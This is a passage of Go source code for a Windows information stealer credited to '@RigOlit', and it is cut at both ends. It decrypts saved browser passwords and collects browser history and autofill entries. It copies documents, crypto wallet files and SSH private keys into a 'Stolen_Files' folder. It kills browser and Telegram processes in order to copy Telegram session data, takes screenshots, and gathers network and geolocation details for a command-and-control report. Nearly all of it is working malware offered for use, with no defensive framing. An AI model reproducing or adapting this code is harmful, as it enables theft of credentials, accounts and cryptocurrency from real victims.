		debugPrint(fmt.Sprintf("Error querying logins from %s: %v", tempLoginDataPath, err))
		return
	}
	defer rows.Close()

	var passwordEntries []PasswordEntry
	for rows.Next() {
		var originURL, username string
		var encryptedPassword []byte
		if err := rows.Scan(&originURL, &username, &encryptedPassword); err != nil {
			debugPrint(fmt.Sprintf("Error scanning password row: %v", err))
			continue
		}

		decryptedPassword := "DECRYPTION_ERROR"
		var decryptErr error

		if len(encryptedPassword) > 3 && (bytes.HasPrefix(encryptedPassword, []byte("v10")) || bytes.HasPrefix(encryptedPassword, []byte("v11")) || bytes.HasPrefix(encryptedPassword, []byte("v20"))) {
			if masterKey != nil && len(masterKey) == 32 {
				plainText, aesErr := decryptAESGCM(masterKey, encryptedPassword)
				if aesErr != nil {
					decryptErr = aesErr
				} else {
					decryptedPassword = string(plainText)
				}
			} else {
				decryptErr = fmt.Errorf("master key is nil or invalid length (%d bytes)", len(masterKey))
			}
		} else if len(encryptedPassword) > 0 {
			plainText, dpapiErr := dpapiDecrypt(encryptedPassword)
			if dpapiErr != nil {
				decryptErr = dpapiErr
			} else {
				decryptedPassword = string(plainText)
			}
		} else {
			decryptedPassword = ""
			decryptErr = nil
		}

		if decryptErr != nil {
			debugPrint(fmt.Sprintf("Error decrypting password for URL: %s, Username: %s: %v", originURL, username, decryptErr))
			passwordEntries = append(passwordEntries, PasswordEntry{
				URL:      originURL,
				Username: username,
				Password: fmt.Sprintf("DECRYPTION_FAILED: %v", decryptErr),
			})
		} else {
			passwordEntries = append(passwordEntries, PasswordEntry{
				URL:      originURL,
				Username: username,
				Password: decryptedPassword,
			})
		}
	}

	if len(passwordEntries) > 0 {
		passwordsOutputPath := filepath.Join(passwordsDestFolder, fmt.Sprintf("%s_%s_passwords.txt", browserName, filepath.Base(profilePath)))
		outputFile, err := os.Create(passwordsOutputPath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error creating password file %s: %v", passwordsOutputPath, err))
		} else {
			defer outputFile.Close()
			for _, entry := range passwordEntries {
				fmt.Fprintf(outputFile, "URL: %s\n", entry.URL)
				fmt.Fprintf(outputFile, "Username: %s\n", entry.Username)
				fmt.Fprintf(outputFile, "Password: %s\n\n", entry.Password)
			}
			debugPrint(fmt.Sprintf("Wrote %d password entries for %s (profile %s) to %s", len(passwordEntries), browserName, filepath.Base(profilePath), passwordsOutputPath))
		}
	} else {
		debugPrint(fmt.Sprintf("No passwords found for %s (profile %s)", browserName, filepath.Base(profilePath)))
	}
	debugPrint(fmt.Sprintf("Finished password extraction for %s, profile: %s", browserName, filepath.Base(profilePath)))
}

func searchAndExfiltrateFiles(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Started file search and exfiltration function.")

	stolenFilesDir := filepath.Join(destFolder, "Stolen_Files")
	cryptoWalletsDir := filepath.Join(stolenFilesDir, "Crypto_Wallets")

	ensureDir(stolenFilesDir)
	ensureDir(cryptoWalletsDir)
	debugPrint(fmt.Sprintf("Created folders for stolen files: %s and %s", stolenFilesDir, cryptoWalletsDir))

	targetExtensions := map[string]bool{
		".doc": true, ".docx": true, ".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true, ".pdf": true,
		".bmp": true,
	}

	walletPatterns := []string{
		"wallet.dat", "key.json", "keystore", "mnemonic.txt", "seed.txt",
		"electrum_wallet", "litecoin_wallet", "dogecoin_wallet",
		"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
	}

	searchPaths := []string{
		os.Getenv("USERPROFILE"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming"),
		filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local"),
	}

	var fileCopyWg sync.WaitGroup
	copiedFiles := make(map[string]bool)
	var mu sync.Mutex

	for _, basePath := range searchPaths {
		if pathExists(basePath) {
			debugPrint(fmt.Sprintf("Started file search in: %s", basePath))
			err := filepath.Walk(basePath, func(filePath string, info os.FileInfo, err error) error {
				if err != nil {
					debugPrint(fmt.Sprintf("Error walking path %s: %v", filePath, err))
					return nil
				}
				if info.IsDir() {
					return nil
				}

				fileName := info.Name()
				ext := strings.ToLower(filepath.Ext(fileName))

				targetDir := ""
				if targetExtensions[ext] {
					targetDir = stolenFilesDir
				} else {
					for _, pattern := range walletPatterns {
						if strings.Contains(strings.ToLower(fileName), pattern) {
							targetDir = cryptoWalletsDir
							break
						}
					}
				}

				if targetDir != "" {
					fileCopyWg.Add(1)
					go func(srcFilePath, dstDir string) {
						defer fileCopyWg.Done()
						dstFilePath := filepath.Join(dstDir, filepath.Base(srcFilePath))

						mu.Lock()
						if copiedFiles[srcFilePath] {
							mu.Unlock()
							return
						}
						copiedFiles[srcFilePath] = true
						mu.Unlock()

						err := copyFile(srcFilePath, dstFilePath)
						if err != nil {
							debugPrint(fmt.Sprintf("Error copying file %s to %s: %v", srcFilePath, dstFilePath, err))
						} else {
							debugPrint(fmt.Sprintf("File copied: %s to %s", srcFilePath, dstFilePath))
						}
					}(filePath, targetDir)
				}
				return nil
			})
			if err != nil {
				debugPrint(fmt.Sprintf("Error walking path %s: %v", basePath, err))
			}
		} else {
			debugPrint(fmt.Sprintf("Base search path does not exist: %s", basePath))
		}
	}

	fileCopyWg.Wait()
	debugPrint("File search and exfiltration function finished.")
}

func takeScreenshot(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Starting screenshot capture.")

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		debugPrint("No active displays found for screenshot.")
		return
	}

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.Capture(bounds.Min.X, bounds.Min.Y, bounds.Dx(), bounds.Dy())
		if err != nil {
			debugPrint(fmt.Sprintf("Error capturing screenshot for display %d: %v", i, err))
			continue
		}

		filePath := filepath.Join(destFolder, fmt.Sprintf("screenshot_display_%d.png", i))
		file, err := os.Create(filePath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error creating screenshot file %s: %v", filePath, err))
			continue
		}
		defer file.Close()

		err = png.Encode(file, img)
		if err != nil {
			debugPrint(fmt.Sprintf("Error encoding screenshot to PNG for %s: %v", filePath, err))
		} else {
			debugPrint(fmt.Sprintf("Screenshot saved to %s", filePath))
		}
	}
	debugPrint("Screenshot capture finished.")
}

func killBrowserProcesses(wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Terminating browser processes.")

	browserNames := []string{
		"chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe",
		"vivaldi.exe", "yandex.exe", "centbrowser.exe", "iridium.exe", "slimjet.exe",
	}

	procs, err := process.Processes()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting process list: %v", err))
		return
	}

	for _, p := range procs {
		pName, err := p.Name()
		if err != nil {
			continue
		}
		for _, browserName := range browserNames {
			if strings.EqualFold(pName, browserName) {
				debugPrint(fmt.Sprintf("Terminating browser process: %s (PID: %d)", pName, p.Pid))
				if err := p.Terminate(); err != nil {
					debugPrint(fmt.Sprintf("Failed to terminate process %s (PID: %d): %v", pName, p.Pid, err))
				} else {
					time.Sleep(100 * time.Millisecond)
					break
				}
			}
		}
	}
	time.Sleep(2 * time.Second)
	debugPrint("Finished terminating browser processes.")
}

func killTelegramProcess(wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Terminating Telegram Desktop processes.")

	procs, err := process.Processes()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting process list for Telegram: %v", err))
		return
	}

	for _, p := range procs {
		pName, err := p.Name()
		if err != nil {
			continue
		}
		if strings.Contains(strings.ToLower(pName), "telegram") {
			debugPrint(fmt.Sprintf("Terminating Telegram process: %s (PID: %d)", pName, p.Pid))
			if err := p.Terminate(); err != nil {
				debugPrint(fmt.Sprintf("Failed to terminate Telegram process %s (PID: %d): %v", pName, p.Pid, err))
			} else {
				time.Sleep(100 * time.Millisecond)
			}
		}
	}
	time.Sleep(2 * time.Second)
	debugPrint("Finished terminating Telegram processes.")
}

func copyTelegramSessionFiles(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Starting Telegram session copying.")

	userFolder, err := os.UserHomeDir()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting user home directory: %v", err))
		return
	}

	telegramSessionFolder := filepath.Join(userFolder, "AppData", "Roaming", "Telegram Desktop", "tdata")
	targetFolder := filepath.Join(destFolder, "tdata")

	if !pathExists(telegramSessionFolder) {
		debugPrint(fmt.Sprintf("Telegram session folder not found at %s", telegramSessionFolder))
		return
	}

	if pathExists(targetFolder) {
		debugPrint(fmt.Sprintf("Removing existing Telegram target folder: %s", targetFolder))
		if err := os.RemoveAll(targetFolder); err != nil {
			debugPrint(fmt.Sprintf("Error removing existing Telegram target folder %s: %v", targetFolder, err))
			return
		}
	}

	err = copyDir(telegramSessionFolder, targetFolder)
	if err != nil {
		debugPrint(fmt.Sprintf("Error copying Telegram session from %s to %s: %v", telegramSessionFolder, targetFolder, err))
	} else {
		debugPrint(fmt.Sprintf("Telegram session copied from %s to %s", telegramSessionFolder, targetFolder))
	}
	debugPrint("Telegram session copying finished.")
}

func deleteTgFiles(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Starting deletion of specific Telegram files.")

	tdataFolder := filepath.Join(destFolder, "tdata")

	itemsToDelete := []string{
		"dumps", "emoji", "tdummy", "temp", "coutries", "devversion", "prefix", "settings", "usertag",
		"working", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5",
	}

	for _, item := range itemsToDelete {
		itemPath := filepath.Join(tdataFolder, item)
		if pathExists(itemPath) {
			if info, err := os.Stat(itemPath); err == nil {
				if info.IsDir() {
					if err := os.RemoveAll(itemPath); err != nil {
						debugPrint(fmt.Sprintf("Error removing Telegram directory %s: %v", itemPath, err))
					} else {
						debugPrint(fmt.Sprintf("Removed Telegram directory: %s", itemPath))
					}
				} else {
					if err := os.Remove(itemPath); err != nil {
						debugPrint(fmt.Sprintf("Error removing Telegram file %s: %v", itemPath, err))
					} else {
						debugPrint(fmt.Sprintf("Removed Telegram file: %s", itemPath))
					}
				}
			} else {
				debugPrint(fmt.Sprintf("Error stating Telegram item %s: %v", itemPath, err))
			}
		} else {
			debugPrint(fmt.Sprintf("Telegram item not found for deletion: %s", itemPath))
		}
	}
	debugPrint("Finished deleting specific Telegram files.")
}

func getLocalIPAddress() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting local IP addresses: %v", err))
		return "Unknown"
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "Unknown"
}

func getMACAddress() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting network interfaces: %v", err))
		return "Unknown"
	}
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			return iface.HardwareAddr.String()
		}
	}
	return "Unknown"
}

func getNetworkInfo() (string, string) {
	cmd := exec.Command("netsh", "wlan", "show", "interfaces")
	output, err := cmd.Output()
	if err != nil {
		debugPrint(fmt.Sprintf("Error running netsh wlan show interfaces: %v", err))
		return "Unknown", "Unknown"
	}

	ssidRegex := regexp.MustCompile(`SSID\s*:\s*(.*)`)
	bssidRegex := regexp.MustCompile(`BSSID\s*:\s*(.*)`)

	ssidMatch := ssidRegex.FindStringSubmatch(string(output))
	bssidMatch := bssidRegex.FindStringSubmatch(string(output))

	ssid := "Unknown"
	bssid := "Unknown"

	if len(ssidMatch) > 1 {
		ssid = strings.TrimSpace(ssidMatch[1])
	}
	if len(bssidMatch) > 1 {
		bssid = strings.TrimSpace(bssidMatch[1])
	}

	return ssid, bssid
}

func getPublicIP() string {
	debugPrint("Attempting to get public IP from external service.")
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		debugPrint(fmt.Sprintf("Error making HTTP request for public IP: %v", err))
		return "IP_Not_Found"
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		debugPrint(fmt.Sprintf("Public IP service returned non-OK status: %s", resp.Status))
		return "IP_Not_Found"
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		debugPrint(fmt.Sprintf("Error reading public IP response body: %v", err))
		return "IP_Not_Found"
	}

	publicIP := strings.TrimSpace(string(body))
	if net.ParseIP(publicIP) == nil {
		debugPrint(fmt.Sprintf("Received string is not a valid IP address: %s", publicIP))
		return "IP_Not_Found"
	}

	return publicIP
}

func getSystemInfo(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Collecting system information.")

	infoFilePath := filepath.Join(destFolder, "!INFO!.txt")
	var infoContent strings.Builder

	infoContent.WriteString("                                                                   \n")
	infoContent.WriteString("                    )   (                *                         \n")
	infoContent.WriteString("             (   ( /(   )\\\\ )    (      (  `          *   )       \n")
	infoContent.WriteString("           ( )\\  )\\\\()) (()/(    )\\\\     )\\\\))(   (   ` )  /(        \n")
	infoContent.WriteString("           )((_)((_)\\\\   /(_))((((_)(  ((_)())\\\\  )\\\\   ( )(_))         \n")
	infoContent.WriteString("          ((_)_   ((_) (_))_| )\\\\ _ )\\\\ (_()((_)((_) (_(_())            \n")
	infoContent.WriteString("           | _ ) / _ \\\\ | |_   (_)_\\\\|_)|  \\\\/  || __||_   _|          \n")
	infoContent.WriteString("           | _ \\\\| (_) || __|   / _ \\\\  | |\\\\/| || _|   | |            \n")
	infoContent.WriteString("           |___/ \\\\___/ |_|    /_/ \\\\_\\\\ _|   |_||___|  |_|            \n")
	infoContent.WriteString("                                                                   \n")
	infoContent.WriteString("    CODED BY: @RigOlit                        CHANNEL: @Rigolit22      \n")
	infoContent.WriteString("----------------------------------------------------------------------\n")

	infoContent.WriteString(fmt.Sprintf("▢ Operating System: %s %s\n", runtime.GOOS, runtime.GOARCH))
	infoContent.WriteString(fmt.Sprintf("▢ Processor (Logical Cores): %d\n", runtime.NumCPU()))
	infoContent.WriteString("▢ CPU Frequency: Not easily available in Go standard lib.\n")

	memInfo, err := mem.VirtualMemory()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting memory info: %v", err))
		infoContent.WriteString("▢ Total Memory: Error\n")
		infoContent.WriteString("▢ Available Memory: Error\n")
		infoContent.WriteString("▢ Used Memory: Error\n")
	} else {
		infoContent.WriteString(fmt.Sprintf("▢ Total Memory: %.2f GB\n", float64(memInfo.Total)/(1024*1024*1024)))
		infoContent.WriteString(fmt.Sprintf("▢ Available Memory: %.2f GB\n", float64(memInfo.Available)/(1024*1024*1024)))
		infoContent.WriteString(fmt.Sprintf("▢ Used Memory: %.2f GB\n", float64(memInfo.Used)/(1024*1024*1024)))
	}

	infoContent.WriteString("▢ Disk Space:\n")
	partitions, err := disk.Partitions(false)
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting disk partitions: %v", err))
		infoContent.WriteString("  - Error getting disk info.\n")
	} else {
		for _, p := range partitions {
			usage, err := disk.Usage(p.Mountpoint)
			if err != nil {
				debugPrint(fmt.Sprintf("Error getting disk usage for %s: %v", p.Mountpoint, err))
				continue
			}
			infoContent.WriteString(fmt.Sprintf("  - Disk %s: Total %.2f GB, Free %.2f GB\n",
				p.Mountpoint, float64(usage.Total)/(1024*1024*1024), float64(usage.Free)/(1024*1024*1024)))
		}
	}

	macAddress := getMACAddress()
	ipAddress := getLocalIPAddress()
	currentUser, err := user.Current()
	username := "Unknown"
	if err == nil {
		username = currentUser.Username
	} else {
		username = os.Getenv("USERNAME")
	}

	computerName, err := os.Hostname()
	if err != nil {
		computerName = "Unknown"
	}

	ssid, bssid := getNetworkInfo()
	publicIP := getPublicIP()

	locationData := getLocationByIP(publicIP)

	infoContent.WriteString("▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\n")
	infoContent.WriteString(fmt.Sprintf("▪ MAC Address: %s\n", macAddress))
	infoContent.WriteString(fmt.Sprintf("▪ IP Address: %s\n", ipAddress))
	infoContent.WriteString(fmt.Sprintf("▪ Username: %s\n", username))
	infoContent.WriteString(fmt.Sprintf("▪ Computer Name: %s\n", computerName))
	infoContent.WriteString(fmt.Sprintf("▪ Public IP: %s\n", publicIP))
	infoContent.WriteString(fmt.Sprintf("▪ SSID: %s\n", ssid))
	infoContent.WriteString(fmt.Sprintf("▪ BSSID: %s\n", bssid))
	infoContent.WriteString(fmt.Sprintf("▪ Location: %s\n", locationData.FullLocationString))
	infoContent.WriteString("▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\n")
	infoContent.WriteString("Subscribe to the developer: @Rigolit22\n")
	infoContent.WriteString("▪▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️\n")

	if err := os.WriteFile(infoFilePath, []byte(infoContent.String()), 0644); err != nil {
		debugPrint(fmt.Sprintf("Error writing system info file %s: %v", infoFilePath, err))
	} else {
		debugPrint(fmt.Sprintf("System info saved to %s", infoFilePath))
	}
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

type BrowserHistoryEntry struct {
	URL        string
	Title      string
	VisitCount int
	LastVisit  time.Time
}

type AutofillEntry struct {
	Name  string
	Value string
}

func getBrowserHistory(browserName string, browserPath string, outputFilePath string) ([]BrowserHistoryEntry, error) {
	historyFilePaths := []string{}

	err := filepath.Walk(browserPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && strings.ToLower(info.Name()) == "history" {
			historyFilePaths = append(historyFilePaths, path)
		}
		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("error walking browser path %s: %w", browserPath, err)
	}

	var allHistoryEntries []BrowserHistoryEntry

	for _, historyFilePath := range historyFilePaths {
		tempFile := filepath.Join(os.TempDir(), randomString(10)+".tmp")
		if err := copyFile(historyFilePath, tempFile); err != nil {
			debugPrint(fmt.Sprintf("Error copying history file %s to temp %s: %v", historyFilePath, tempFile, err))
			continue
		}
		defer os.Remove(tempFile)

		db, err := sql.Open("sqlite", tempFile)
		if err != nil {
			debugPrint(fmt.Sprintf("Error opening history database %s: %v", tempFile, err))
			continue
		}
		defer db.Close()

		rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls")
		if err != nil {
			debugPrint(fmt.Sprintf("Error querying history from %s: %v", tempFile, err))
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var url, title string
			var visitCount int
			var lastVisitTime int64
			err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
			if err != nil {
				debugPrint(fmt.Sprintf("Error scanning history row: %v", err))
				continue
			}

			lastVisit := time.Unix(lastVisitTime/1000000-11644473600, 0)

			allHistoryEntries = append(allHistoryEntries, BrowserHistoryEntry{
				URL:        url,
				Title:      title,
				VisitCount: visitCount,
				LastVisit:  lastVisit,
			})
		}
	}

	sort.Slice(allHistoryEntries, func(i, j int) bool {
		return allHistoryEntries[i].LastVisit.After(allHistoryEntries[j].LastVisit)
	})

	if len(allHistoryEntries) > 0 {
		outputFile, err := os.Create(outputFilePath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error creating history file %s: %v", outputFilePath, err))
			return nil, fmt.Errorf("error creating history file: %w", err)
		}
		defer outputFile.Close()

		fmt.Fprintf(outputFile, "%s Browser History\n", browserName)
		fmt.Fprintf(outputFile, "%s\n\n", strings.Repeat("=", 50))
		for _, entry := range allHistoryEntries {
			fmt.Fprintf(outputFile, "URL: %s\n", entry.URL)
			fmt.Fprintf(outputFile, "Title: %s\n", entry.Title)
			fmt.Fprintf(outputFile, "Visit Count: %d\n", entry.VisitCount)
			fmt.Fprintf(outputFile, "Last Visit: %s\n", entry.LastVisit.Format("15:04:05 2006-01-02"))
			fmt.Fprintf(outputFile, "%s\n", strings.Repeat("-", 50))
		}
		debugPrint(fmt.Sprintf("Wrote %d history entries for %s to %s", len(allHistoryEntries), browserName, outputFilePath))
	} else {
		debugPrint(fmt.Sprintf("No history found for %s", browserName))
	}

	return allHistoryEntries, nil
}

func getAutofills(browserName string, browserPath string, outputFilePath string) ([]AutofillEntry, error) {
	webDataFilePaths := []string{}

	err := filepath.Walk(browserPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && strings.ToLower(info.Name()) == "web data" {
			webDataFilePaths = append(webDataFilePaths, path)
		}
		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("error walking browser path %s: %w", browserPath, err)
	}

	var allAutofillEntries []AutofillEntry

	for _, webDataFilePath := range webDataFilePaths {
		tempFile := filepath.Join(os.TempDir(), randomString(10)+".tmp")
		if err := copyFile(webDataFilePath, tempFile); err != nil {
			debugPrint(fmt.Sprintf("Error copying web data file %s to temp %s: %v", webDataFilePath, tempFile, err))
			continue
		}
		defer os.Remove(tempFile)

		db, err := sql.Open("sqlite", tempFile)
		if err != nil {
			debugPrint(fmt.Sprintf("Error opening web data database %s: %v", tempFile, err))
			continue
		}
		defer db.Close()

		rows, err := db.Query("SELECT name, value FROM autofill")
		if err != nil {
			debugPrint(fmt.Sprintf("Error querying autofill from %s: %v", tempFile, err))
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var name, value string
			err := rows.Scan(&name, &value)
			if err != nil {
				debugPrint(fmt.Sprintf("Error scanning autofill row: %v", err))
				continue
			}
			name = strings.TrimSpace(name)
			value = strings.TrimSpace(value)
			if name != "" && value != "" {
				allAutofillEntries = append(allAutofillEntries, AutofillEntry{Name: name, Value: value})
			}
		}
	}

	if len(allAutofillEntries) > 0 {
		outputFile, err := os.Create(outputFilePath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error creating autofill file %s: %v", outputFilePath, err))
			return nil, fmt.Errorf("error creating autofill file: %w", err)
		}
		defer outputFile.Close()

		for _, entry := range allAutofillEntries {
			fmt.Fprintf(outputFile, "FORM: %s\n", entry.Name)
			fmt.Fprintf(outputFile, "VALUE: %s\n\n", entry.Value)
		}
		debugPrint(fmt.Sprintf("Wrote %d autofill entries to %s", len(allAutofillEntries), outputFilePath))
	} else {
		debugPrint(fmt.Sprintf("No autofill data found."))
	}

	return allAutofillEntries, nil
}

func processBrowserProfilesForHistoryAndAutofill(browserName string, historyAutofillDestFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint(fmt.Sprintf("Starting history and autofill processing for %s", browserName))

	baseUserDataPath := ""
	switch browserName {
	case "chrome":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
	case "edge":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
	case "yandex":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
	case "brave":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
	case "vivaldi":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data")
	case "slimjet":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Slimjet", "User Data")
	case "iridium":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data")
	case "centbrowser":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data")
	case "opera":
		baseUserDataPath = filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable")
	case "opera_gx":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera GX Stable")
	default:
		debugPrint(fmt.Sprintf("Browser %s is not configured for history/autofill extraction in Go module.", browserName))
		return
	}

	if !pathExists(baseUserDataPath) {
		debugPrint(fmt.Sprintf("Base user data path not found for %s at path: %s", browserName, baseUserDataPath))
		return
	}
	debugPrint(fmt.Sprintf("Found base user data path for %s at path: %s", browserName, baseUserDataPath))

	var profilePaths []string
	if browserName == "opera" || browserName == "opera_gx" {
		profilePaths = append(profilePaths, baseUserDataPath)
	} else {
		entries, err := os.ReadDir(baseUserDataPath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error reading user data directory for %s: %v", browserName, err))
			return
		}
		for _, entry := range entries {
			if entry.IsDir() && (strings.HasPrefix(entry.Name(), "Profile") || entry.Name() == "Default" || entry.Name() == "Guest Profile") {
				profilePaths = append(profilePaths, filepath.Join(baseUserDataPath, entry.Name()))
			}
		}
	}

	if len(profilePaths) == 0 {
		debugPrint(fmt.Sprintf("No profiles found for %s under %s", browserName, baseUserDataPath))
		return
	}
	debugPrint(fmt.Sprintf("Found %d profiles for %s: %v", len(profilePaths), browserName, profilePaths))

	var profileWg sync.WaitGroup
	for _, pPath := range profilePaths {
		profileWg.Add(1)
		go func(p string, currentBrowserName string, currentHistoryAutofillDestFolder string) {
			defer profileWg.Done()
			profileBaseName := filepath.Base(p)

			historyOutputPath := filepath.Join(currentHistoryAutofillDestFolder, fmt.Sprintf("%s_%s_history.txt", strings.ReplaceAll(strings.ToLower(currentBrowserName), " ", "_"), profileBaseName))
			_, err := getBrowserHistory(currentBrowserName, p, historyOutputPath)
			if err != nil {
				debugPrint(fmt.Sprintf("Error getting history for %s profile %s: %v", currentBrowserName, profileBaseName, err))
			}

			autofillOutputPath := filepath.Join(currentHistoryAutofillDestFolder, fmt.Sprintf("%s_%s_autofills.txt", strings.ReplaceAll(strings.ToLower(currentBrowserName), " ", "_"), profileBaseName))
			_, err = getAutofills(currentBrowserName, p, autofillOutputPath)
			if err != nil {
				debugPrint(fmt.Sprintf("Error getting autofills for %s profile %s: %v", currentBrowserName, profileBaseName, err))
			}
		}(pPath, browserName, historyAutofillDestFolder)
	}
	profileWg.Wait()
	debugPrint(fmt.Sprintf("Finished history and autofill processing for %s", browserName))
}

type LocationData struct {
	City               string `json:"city"`
	Region             string `json:"region"`
	Country            string `json:"country"`
	Loc                string `json:"loc"`
	Latitude           float64
	Longitude          float64
	FullLocationString string
}

func getLocationByIP(publicIP string) LocationData {
	debugPrint(fmt.Sprintf("Attempting to get geolocation for public IP: %s", publicIP))
	location := LocationData{
		City:               "Unknown",
		Region:             "Unknown",
		Country:            "Unknown",
		Loc:                "0,0",
		Latitude:           0.0,
		Longitude:          0.0,
		FullLocationString: "Failed to get location",
	}

	if publicIP == "IP_Not_Found" || publicIP == "IP_Error" || publicIP == "127.0.0.1" {
		debugPrint("Skipping geolocation for local or unknown IP.")
		return location
	}

	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(fmt.Sprintf("https://ipinfo.io/%s/json", publicIP))
	if err != nil {
		debugPrint(fmt.Sprintf("Error making HTTP request for geolocation: %v", err))
		return location
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		debugPrint(fmt.Sprintf("Geolocation API returned non-OK status: %s", resp.Status))
		return location
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		debugPrint(fmt.Sprintf("Error reading geolocation response body: %v", err))
		return location
	}

	if err := json.Unmarshal(body, &location); err != nil {
		debugPrint(fmt.Sprintf("Error unmarshalling geolocation JSON: %v", err))
		return location
	}

	location.FullLocationString = fmt.Sprintf("%s, %s, %s", location.City, location.Region, location.Country)

	if location.Loc != "" {
		coords := strings.Split(location.Loc, ",")
		if len(coords) == 2 {
			if _, err := fmt.Sscanf(coords[0], "%f", &location.Latitude); err != nil {
				debugPrint(fmt.Sprintf("Error parsing latitude: %v", err))
			} else if _, err := fmt.Sscanf(coords[1], "%f", &location.Longitude); err != nil {
				debugPrint(fmt.Sprintf("Error parsing longitude: %v", err))
			}
		}
	}
	debugPrint(fmt.Sprintf("Geolocation obtained: %s", location.FullLocationString))
	return location
}

func getFormattedSystemInfoForC2(publicIP string) (string, float64, float64) {
	debugPrint("Collecting system information for C2.")
	var infoContent strings.Builder

	infoContent.WriteString("                                                                   \n")
	infoContent.WriteString("                    )   (                *                         \n")
	infoContent.WriteString("             (   ( /(   )\\\\ )    (      (  `          *   )       \n")
	infoContent.WriteString("           ( )\\  )\\\\()) (()/(    )\\\\     )\\\\))(   (   ` )  /(        \n")
	infoContent.WriteString("           )((_)((_)\\\\   /(_))((((_)(  ((_)())\\\\  )\\\\   ( )(_))         \n")
	infoContent.WriteString("          ((_)_   ((_) (_))_| )\\\\ _ )\\\\ (_()((_)((_) (_(_())            \n")
	infoContent.WriteString("           | _ ) / _ \\\\ | |_   (_)_\\\\|_)|  \\\\/  || __||_   _|          \n")
	infoContent.WriteString("           | _ \\\\| (_) || __|   / _ \\\\  | |\\\\/| || _|   | |            \n")
	infoContent.WriteString("           |___/ \\\\___/ |_|    /_/ \\\\_\\\\ _|   |_||___|  |_|            \n")
	infoContent.WriteString("                                                                   \n")
	infoContent.WriteString("    CODED BY: @RigOlit                        CHANNEL: @Rigolit22      \n")
	infoContent.WriteString("----------------------------------------------------------------------\n")

	infoContent.WriteString(fmt.Sprintf("▢ Operating System: %s %s\n", runtime.GOOS, runtime.GOARCH))
	infoContent.WriteString(fmt.Sprintf("▢ Processor (Logical Cores): %d\n", runtime.NumCPU()))
